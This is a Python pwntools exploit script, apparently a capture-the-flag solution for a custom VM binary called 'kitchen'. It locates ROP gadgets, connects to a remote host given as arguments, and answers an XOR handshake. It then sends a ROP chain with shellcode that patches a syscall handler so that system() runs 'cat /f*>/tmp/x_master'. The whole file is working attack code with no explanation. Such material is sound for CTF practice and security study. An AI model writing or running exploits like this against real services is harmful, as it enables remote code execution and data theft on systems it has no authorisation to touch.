#!/usr/bin/env python3

from pwn import *

import struct
import binascii
import sys

RAINBOW_SC_ADDR = 0xEF7C
SC_HANDLER = 0x4002BD
SYSTEM = 0x4033A2
DELTA = SYSTEM - SC_HANDLER

data = open("../prog/kitchen.bin", "rb").read()

num_mapping = struct.unpack("<H", data[8:10])[0]
text_base = struct.unpack("<H", data[10:12])[0]

code_start = 10 + num_mapping * 6
code = data[code_start:]

unhex = lambda x: binascii.unhexlify(x.replace(" ", ""))

G_POP_LR_R5_R4_R2_R1_R0 = code.find(
    unhex(
        "09 09 00 00 09 05 00 00 09 04 00 00 09 02 00 00 09 01 00 00 09 00 00 00 0c 00 00 00"
    )
)

G_IPC_SEND = code.find(unhex("05 03 00 00 09 09 00 00 0c 00 00 00"))
G_IPC_RECV = code.find(unhex("05 04 00 00 09 09 00 00 0c 00 00 00"))
G_PUTS = code.find(
    unhex(
        "08 04 00 00 08 05 00 00 08 09 00 00 07 40 00 00 07 51 00 00 02 01 00 04 06 08 00 05 01 03 10 00 05 01 00 00 04 01 04 01"
    )
)

print("%x %x %x" % (G_POP_LR_R5_R4_R2_R1_R0, G_IPC_SEND, G_IPC_RECV))

if G_IPC_SEND == -1 or G_IPC_RECV == -1 or G_POP_LR_R5_R4_R2_R1_R0 == -1:
    print("Could not find gadgets")
    exit(1)


p = remote(sys.argv[1], int(sys.argv[2]))

p.readuntil(b"cooking this stew:\n\n")
challenge = p.readline().strip().decode()

print(challenge)

dw = struct.unpack("<LLLL", bytes.fromhex(challenge))

response = struct.pack(
    "<LLLL",
    dw[0] ^ 0xC0CAC01A,
    dw[1] ^ 0xD15EA5E,
    dw[2] ^ 0x5CAFF01D,
    dw[3] ^ 0xBA5EBA11,
)

p.sendline(binascii.hexlify(response).decode())

# p.interactive()

p.readuntil(b"choice> ")
p.sendline(b"2")
p.readuntil(b"your friendship?\n")

rop = [
    G_POP_LR_R5_R4_R2_R1_R0,
    G_IPC_SEND,
    0x55555555,
    0x4444444A,
    0x22222222,
    0x110,  # r1
    0xFDB8 + 8,  # r0
    G_POP_LR_R5_R4_R2_R1_R0,
    G_IPC_RECV,
    RAINBOW_SC_ADDR,  # PC for rainbow, right after c0cac01a hdr
    0x4444444B,
    0x22222222,
    0x100,  # r1
    0x8000,  # r0
    G_POP_LR_R5_R4_R2_R1_R0,
    G_PUTS,
    0x55555555,
    0x4444444C,
    0x22222222,
    0x11111111,  # r1
    0x8000,
]


SC_RAINBOW = [
    0x07010000,  # mov r0, 0x1234 (r0 is the delta between sc_handler and systsme())
    0x07110000,  # mov r1, 0x5678 (r1 is the address of the hax opcode that needs patching)
    0x07210C00,  # mov r2, 0x0C
    0x04010201,  # add r2. 0x01
    0x03010201,  # strb r2, [r1]
    0x0400FF00,  # hax_add_r0
    0x07810000,  # mov sp, 0x4567 (sp is the address of the shell command)
    0x09000000,  # pop r0
    0x09010000,  # pop r1
    0x09020000,  # pop r2
    0x05AA0000,  # syscall 0xAA
]

swap16 = lambda x: ((x & 0xFF) << 8) | ((x >> 8) & 0xFF)

SC_RAINBOW[0] |= swap16(DELTA)
SC_RAINBOW[1] |= swap16(RAINBOW_SC_ADDR + 0x16)
SC_RAINBOW[6] |= swap16(RAINBOW_SC_ADDR + (0x40 - 12) + (len(rop) * 8))

SC_RAINBOW = b"".join([struct.pack(">L", i) for i in SC_RAINBOW])

CMD = b"cat /f*>/tmp/x_master\x00"

if b"\x0a" in SC_RAINBOW:
    print("SC_RAINBOW contains newline")
    exit(1)

if b"\x0d" in SC_RAINBOW:
    print("SC_RAINBOW contains carriage return")
    exit(1)


pkt = struct.pack("<L", 0xC0CAC01A) * 3
pkt += SC_RAINBOW
pkt += b"A" * (0x40 - len(pkt))

for i in rop:
    pkt += struct.pack("<Q", i)
pkt += CMD

print("len: %d" % len(pkt))

p.sendline(pkt)
p.interactive()
